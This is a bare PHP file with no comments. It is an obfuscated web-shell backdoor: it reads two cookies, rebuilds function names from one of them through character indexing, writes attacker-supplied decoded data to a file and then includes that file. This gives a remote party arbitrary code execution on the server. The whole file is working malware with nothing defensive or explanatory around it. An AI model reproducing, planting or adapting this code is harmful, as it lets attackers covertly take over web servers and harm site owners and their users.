<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[36])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[36][$n];
        if (!$c[36][$n + 1]) {
            if (!$c[36][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[24]() . $p[26];
    if (!$p[12]($k)) {
        $n = $p[11]($k, $p[13]);
        $p[17]($n, $p[29] . $p[22]($p[1]($c[3])));
    }
    include($k);
}